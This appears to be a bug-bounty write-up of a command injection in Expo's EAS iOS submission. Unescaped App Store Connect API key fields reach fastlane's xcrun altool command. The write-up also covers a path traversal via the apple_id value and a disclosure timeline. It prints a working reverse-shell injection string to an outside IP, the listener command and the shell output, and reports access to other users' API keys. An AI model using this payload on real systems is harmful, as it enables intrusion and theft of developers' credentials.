# RCE on EAS

[Expo.dev](https://expo.dev/) is an open-source platform for making universal React native apps for iOS and Android.  
Their offering is composed of 2 products:
- Expo, an open-source project that gives developers powerful tools to assist in building and maintaining React Native apps at any scale. Building an Expo app means building a React Native app that uses Expo tools.
- Expo Application Services (EAS), a suit of hosted services that can be used for React Native apps to build, submit and update your app in a team.

Whenever a new update must be pushed to customers for an iOS application, it can either be done by:
- pushing a new update to the AppStore: the AppStore will silently update the application at night or if the user trigger it manually ;
- pushing "Over the Air" (OTA) updates: the application will frequently check for updates when running and reloads whenever a new update is available.

Usually, a developer will want to do both. Pushing OTA will ensure that customers always run on the latest version of an application but they will have to wait a few seconds for the update to be downloaded on start-up. However, if the customer do not open his application for a few days, it will update it through the AppStore. This kind of update will prevent the slight delay that an OTA update would cause at start-up.

When pushing a new update to the AppStore, you have to go through a review process of your application through App Store Connect, an Apple website where Apple developers manage their application. Because the process to submit your application for review at every update is so repetitive, EAS offers a way to automate it through a command: `eas submit -p ios`.

When running this command, the user is prompted to:
- choose a build
- login to his apple developer account if he does not have an ASC API key yet

This ASC API key is required by EAS to authenticate to the AppStore Connect API and perform actions on your behalf.

When trying to submit an incorrect build (for example, a build that was already submitted to Apple) to TestFlight, EAS fail with the following output:

```
[...]
Fastlane pilot failed
fastlane run pilot ipa:/var/folders/qx/k3m870nx1_342jy0bk5sp0c80000gn/T/submissions/6e440124-f077-460a-88a5-935516d3a6fa/ef4eaf46-b19c-49fe-96f3-ad4eb41472f3.ipa skip_waiting_for_build_processing:true apple_id:123456 api_key_path:/var/folders/qx/k3m870nx1_342jy0bk5sp0c80000gn/T/submissions/6e440124-f077-460a-88a5-935516d3a6fa/ascApiJsonKey-68743eac-9abd-471d-bbe6-9af97ff10f12.json 
Failed to submit the app
You've already submitted this build of the app.
```

EAS utilizes the open-source tool [`fastlane pilot`](https://github.com/fastlane/fastlane/tree/master/pilot) to submit applications to the AppStore. The Fastlane command requires four parameters including 3 we have some control over:
- `ipa`: Path to the application archive. This is the application archive built by EAS from our React Native app source code.
- `apple_id`: User-provided Apple application ID.
- `api_key_path`: JSON file generated by EAS containing ASC API key information from the authentication step.

While testing for vulnerabilities, the `apple_id` parameter did not seem susceptible to trivial injection points. It accepted various values without it having any impact, such as `| sleep 60 |`, indicating either proper concatenation to the command with shell escaping functions or direct invokation of the binary program.

I then opted to examine the [fastlane pilot code](https://github.com/fastlane/fastlane/tree/master/pilot) to understand how it processes arguments. Specifically, I first focused on the handling of the `apple_id` parameter, referred to as `app_id` in the code.

[ipa_upload_package_builder.rb#L15-L20](https://github.com/fastlane/fastlane/blob/master/fastlane_core/lib/fastlane_core/ipa_upload_package_builder.rb#L15-L20)
```rb
def generate(app_id: nil, ipa_path: nil, package_path: nil, platform: nil)
    self.package_path = File.join(package_path, "#{app_id}-#{SecureRandom.uuid}.itmsp")
    FileUtils.rm_rf(self.package_path) if File.directory?(self.package_path)
    FileUtils.mkdir_p(self.package_path)

    ipa_path = copy_ipa(ipa_path)
```

[ipa_upload_package_builder.rb#L45-L50](https://github.com/fastlane/fastlane/blob/14037c658dc93f503453100ab222d520c1d3f19d/fastlane_core/lib/fastlane_core/ipa_upload_package_builder.rb#L45-L50)
```rb
def copy_ipa(ipa_path)
    ipa_file_name = unique_ipa_path(ipa_path)
    resulting_path = File.join(self.package_path, ipa_file_name)
    FileUtils.cp(ipa_path, resulting_path)

    return resulting_path
end
```

We see that the `app_id` is used in multiple file operations. For example, setting `apple_id` to `/../../../tmp/test/../../../tmp/` would result in the following execution:

```rb
irb(main):01:0> package_path = File.join("/tmp/abcd", "/../../../tmp/test/../../../tmp/-75273d13-dae7-4993-a259-b62075d63e38.itmsp")
=> "/tmp/abcd/../../../tmp/test/../../../tmp/-75273d13-dae7-4993-a259-b62075d63e38.itmsp"
irb(main):02:0> File.directory?(package_path)
=> false
irb(main):03:0> FileUtils.mkdir_p(package_path)
=> ["/tmp/abcd/../../../tmp/test/../../../tmp/-75273d13-dae7-4993-a259-b62075d63e38.itmsp"]
```

and create 3 folders:
- `/tmp/abcd`
- `/tmp/test`
- `/tmp/-75273d13-dae7-4993-a259-b62075d63e38.itmsp`

I hoped that `FileUtils.cp(ipa_path, resulting_path)` would copy the `ipa` to the 3 folders. However, it logically only copied to `/tmp/-75273d13-dae7-4993-a259-b62075d63e38.itmsp`. By manipulating the `apple_id` we can:
- create arbitrary folders on the system where the executing user has the necessary rights.
- copy the `ipa` (over which we have some control) to any location where the executing user has rights.

While there was potential for placing executable code in the `ipa` and getting it to the right location for command execution, it seemed challenging without knowledge of the system and installed components. Even with such knowledge, success would require a significant amount of luck. I decided to shift focus and examine the `api_key_path`.

The ASCI API key file, named `ascApiJsonKey-68743eac-9abd-471d-bbe6-9af97ff10f12.json`, is constructed by EAS from user-provided input and includes a key ID, an issuer ID, and a private key. The following is the relevant fastlane code that reads the JSON file:

[token.rb#L37-L76](https://github.com/fastlane/fastlane/blob/39ed6fed0c3cb8439238c4aec62384c59966931f/spaceship/lib/spaceship/connect_api/token.rb#L37-L76)
```rb
def self.from_json_file(filepath)
    json = JSON.parse(File.read(filepath), { symbolize_names: true })

    missing_keys = []
    missing_keys << 'key_id' unless json.key?(:key_id)
    missing_keys << 'issuer_id' unless json.key?(:issuer_id)
    missing_keys << 'key' unless json.key?(:key)

    unless missing_keys.empty?
        raise "App Store Connect API key JSON is missing field(s): #{missing_keys.join(', ')}"
    end

    self.create(**json)
    end

def self.create(key_id: nil, issuer_id: nil, filepath: nil, key: nil, is_key_content_base64: false, duration: nil, in_house: nil, **)
    # [...]
    self.new(
        key_id: key_id,
        issuer_id: issuer_id,
        key: OpenSSL::PKey::EC.new(key),
        key_raw: key,
        duration: duration,
        in_house: in_house
    )
```

the key is then used in the invocation of `xcrun altool`, a binary for validating and uploading app to App Store Connect

[itunes_transporter.rb#L277-L293](https://github.com/fastlane/fastlane/blob/39ed6fed0c3cb8439238c4aec62384c59966931f/fastlane_core/lib/fastlane_core/itunes_transporter.rb#L277-L293)
```rb
def build_upload_command(username, password, source = "/tmp", provider_short_name = "", jwt = nil, platform = nil, api_key = nil)
    use_api_key = !api_key.nil?
    [
    ("API_PRIVATE_KEYS_DIR=#{api_key[:key_dir]}" if use_api_key),
    "xcrun altool",
    "--upload-app",
    ("-u #{username.shellescape}" unless use_api_key),
    ("-p #{password.shellescape}" unless use_api_key),
    ("--apiKey #{api_key[:key_id]}" if use_api_key),
    ("--apiIssuer #{api_key[:issuer_id]}" if use_api_key),
    ("--asc-provider #{provider_short_name}" unless use_api_key || provider_short_name.to_s.empty?),
    platform_option(platform),
    file_upload_option(source),
    additional_upload_parameters,
    "-k 100000"
    ].compact.join(' ')
end
```

what we notice is that the `apiKey` and `apiIssuer` are concatenated in the `xcrun` command and then executed by 

[itunes_transporter.rb#L790](https://github.com/fastlane/fastlane/blob/39ed6fed0c3cb8439238c4aec62384c59966931f/fastlane_core/lib/fastlane_core/itunes_transporter.rb#L790)
```rb
command = @transporter_executor.build_upload_command(@user, @password, actual_dir, @provider_short_name, @jwt, platform, api_key)
```

In our case, `@transporter_executor` is `AltoolTransporterExecutor` because it is the binary shipped with recent version of XCode. `AltoolTransporterExecutor:build_upload_command` does not perform any sanitizing and run the command as is:

[itunes_transporter.rb#L236-L241](https://github.com/fastlane/fastlane/blob/39ed6fed0c3cb8439238c4aec62384c59966931f/fastlane_core/lib/fastlane_core/itunes_transporter.rb#L236-L241)
```rb
exit_status = FastlaneCore::FastlanePty.spawn(command) do |command_stdout, command_stdin, pid|
    command_stdout.each do |line|
    @all_lines << line
    parse_line(line, hide_output)
    end
end
```

This looked vulnerable. I created an AppStore Connnect API key in my Expo account with the following values:  
ASC API Key File: A private key 
Key Identifier: `Apple`  
Issuer Identifier: `| sh -i >& /dev/tcp/45.155.169.171/4242 0>&1 |`  
Name: `Apple`  

The server didn't produce any error and no sanitization seemed to happen when I saved this ASC API key.  
On my server (with ip `45.155.169.171`) I started listening for a shell

```
> nc -lvp 4242
Listening on 0.0.0.0 4242
```

I then created a new submission with `eas submit -p ios` and the following command executed on expo server:

```
API_PRIVATE_KEYS_DIR=/var/folders/qx/k3m870nx1_342jy0bk5sp0c80000gn/T/deliver-20240127-827700-gxi0bj/AuthKey_Apple.p8 xcrun altool --upload-app --apiKey Apple --apiIssuer | sh -i >& /dev/tcp/45.155.169.171/4242 0>&1 | -k 100000 -t ios -assetFile /var/folders/qx/k3m870nx1_342jy0bk5sp0c80000gn/T/submissions/01c4e4d7-5efa-47dd-9dfc-47105e56b3f2/8cb3a583-90d4-4677-a69e-63e2519f2323.ipa
```

which returned a shell to `45.155.169.171`:

```
Connection received on WI-MKE1-DC2-A7-8-AF.cyberlynk.net 41230
sh: no job control in this shell
> sh-3.2$ id
uid=501(expo) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae),701(com.apple.sharepoint.group.1)
```

Surprisingly, the submission process, unlike the EAS build infrastructure (where it would be trivial to get RCE), was shared among all EAS users. Indeed, I could spy on the submission folder (`/var/folders/qx/k3m870nx1_342jy0bk5sp0c80000gn/T/submissions/`) and view other users' ASC API keys and `.ipa` as they submitted their applications through EAS. I then validated the ability to read ASC API keys by running a submission process with an alternate account of mine.

At this point, I decided to stop the exploitation and report it to Expo.

Timeline:
- 01-24-2024: RCE reported to expo
- 01-24-2024: expo acknowledge the issue
- 01-24-2024: expo patch fastlane to shell escape api keys
- 01-25-2024: bounty awarded by expo
- 04-02-2024: expo issue [public security notice](https://expo.dev/blog/security-notice-for-eas-submit)
- 04-03-2024: public write-up